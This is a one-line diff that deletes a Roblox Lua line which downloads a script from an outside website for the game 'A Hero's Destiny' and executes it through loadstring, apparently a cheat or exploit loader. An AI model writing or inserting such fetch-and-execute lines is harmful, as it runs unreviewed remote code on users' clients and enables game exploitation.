@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://www.assasine.com/Scripts/A%20Hero's%20Destiny.lua", true))()
